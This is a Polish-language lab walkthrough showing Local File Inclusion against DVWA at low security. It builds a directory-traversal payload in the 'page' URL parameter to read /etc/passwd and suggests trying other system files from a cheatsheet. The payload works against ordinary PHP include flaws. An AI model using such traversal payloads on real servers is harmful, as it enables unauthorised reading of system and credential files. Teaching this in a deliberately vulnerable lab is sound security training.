# File Inclusion- Walkthrough

- Autor: [Mateusz Głuchowski](https://github.com/hue1337)

# Local File Inclusion- DVWA

## Jak połączyć się z DVWA?
1) Wpisujemy w przeglądarce link: http://192.168.13.198/DVWA/vulnerabilities/fi/?file=include.php.
2) Upewniamy się, że poziom trudności jest ustawiony na `LOW`:

    <img src="pics/LFI3.png">

3) Jeżeli poziom trudności jest inny to zmieniamy go w zakładce `DVWA Security`:

    <img src="pics/LFI4.png">

4) Na koniec przechodzimy do zakładki `File Inclusion`:

    <img src="pics/LFI5.png">

## Cheatsheet- Local File Inclusion
- Zanim przejdziemy do przeprowadzenia ataku warto wiedzieć, czego będziemy szukali na serwerze. Poniżej znajduję lista powszechnych plików systemowych, których możemy użyć podczas testowania aplikacji:

    <img src="pics/thm1.png">

    _Źródło: https://tryhackme.com_


## LFI- Low Security

- Teraz możemy w pełni przejść do przeprowadzenia ataku `LFI`. W linku znajduje się parametr odpowiadający za ładowanie strony internetowej, którym będziemy się posługiwali przez całe walkthorugh:

    ```
    ?page=include.php
    ```
    <img src="pics/LFI1.png">


- Na poziomie **LOW** praktycznie nie ma zabezpieczeń, w związku z czym od razu możemy przejść do zabwy:

    1) Zmieniamy wartość parametru w URL z `index.php` w celu zobaczenia zachowania maszyny (zobaczanie potncjalnych informacji o błędzie np.: `... include(var/www/html/DVWA/.../file.txt) ... not found`):
        ```
        http://192.168.X.X/DVWA/vulnerablity/fi/?page=file.txt
        ```
    2) Niestety aplikacja nie podaje informacji zwrotnych, w związku z czym albo korzystamy z wiedzy własnej, albo pytamy o pomoc **WUJKA GOOGLE**. Serwisy postawione na systemów z rodziny UNIX najczęściej mają kody źródłowe umieszczone w folderze `var/www/html/kod_zrodlowy.php`. W związku z czym analizujemy na czym stoimy:
        - Link wygląda następująco:
            ```
            http://192.168.X.X/DVWA/vulnerablities/fi/?page=include.php
            ```
        - Po adresie `IP` znajduje się ścieżka do pliku (strony), na której się znajdujemy:
            ```
            /DVWA/vulnerabilities/fi/?page=include.php
            ```
        - Wcześniej dowiedzieliśmy się, że aplikacja znajduję się (najprawdopodbniej) na ścieżce `var/www/html/`. Łącząc fakty dostajemy ścieżkę:
            ```
            var/www/html/DVWA/vulnerabilities/fi/
            ```
        - Na podstawie tego widzimy, że musimy przejść 6 folderów do góry, aby dostać się do folderu głównego. Zaczynamy tworzyć **PAYLOAD** wykorzystując `Directory Traversal`:
            ```
            ../../../../../../
            ```
        - Uznajmy, że naszą flagą będzie plik `/etc/passwd`, który wzięliśmy ze ściągawki. Rozbudowujemy **PAYLAODA**:
            ```
            ../../../../../../etc/passwd
            ```
    3) Stworzonego **PAYLOADA** podstawiamy jako parametr linku:
        ```
        http://192.168.X.X/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
        ```
        Po wyświetleniu się zawartości pliku `etc/passwd` wiemy, że nasz payload zadziałał: 
        
        <img src="pics/LFI6.png">

- Polecam spróbować stworzyć **PAYLOADY** w celu wyświetleniach zawartości innych plików z naszego **CHEATSHEETU**.

    
    
